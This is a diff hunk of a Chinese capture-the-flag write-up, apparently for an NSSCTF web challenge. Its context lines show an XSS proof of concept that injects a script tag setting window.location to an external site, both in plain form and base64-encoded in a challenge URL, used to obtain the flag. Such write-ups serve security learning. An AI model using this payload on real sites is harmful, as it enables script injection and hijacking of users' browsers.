@@ -22,7 +22,7 @@ if (preg_match(&#39;/^https?:\/\/\S&#43;$/&#39;, $contentLines[0])) {
 利用`window.location`  
 构造`poc`  
 `https://&#34;&gt;&lt;script&gt;window.location=&#34;https://ymzx.qq.com/&#34;&lt;/script&gt;.png /png`  
-得到``  
+得到
 `http://node2.anna.nssctf.cn:28764/words/?title=MQ==&amp;content=aHR0cHMlM0ElMkYlMkYlMjIlM0UlM0NzY3JpcHQlM0V3aW5kb3cubG9jYXRpb24lM0QlMjJodHRwcyUzQSUyRiUyRnltengucXEuY29tJTJGJTIyJTNDJTJGc2NyaXB0JTNFLnBuZyUyMCUyRnBuZw==`  
 在门酱处插入得到`flag`  
 ![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202402141654151.png)
